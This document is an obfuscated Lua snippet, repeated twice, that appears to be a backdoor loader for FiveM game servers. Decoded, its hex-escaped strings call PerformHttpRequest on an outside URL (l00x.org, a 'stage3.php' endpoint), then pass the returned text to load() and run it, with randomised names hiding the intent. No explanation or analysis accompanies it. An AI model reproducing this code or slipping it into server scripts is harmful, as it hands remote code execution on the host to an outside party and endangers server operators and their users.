local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)

local IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x30\x30\x78\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48", function (hEIpYVbWWgklHzTGOwlGaXlojftvmXXDAUDhJfesPupTEhOGdoiqwSXKQAnPnOMmROLaGA, iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg) if (iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[6] or iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg == IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[5]) then return end IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[2]](IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[4][IoWsqmnJWneZnwGyHOSZSDhQWiUqUTdaVlcGBEFLXfxqyFxOnmZLfuQQHjONSWJvXeyPjz[3]](iDawqUIHlmlztEtmvGNNqvaoSPfUoZyTrIMPcrwybphFQsrRwcpxwubAdBpYfRRjjdEDvg))() end)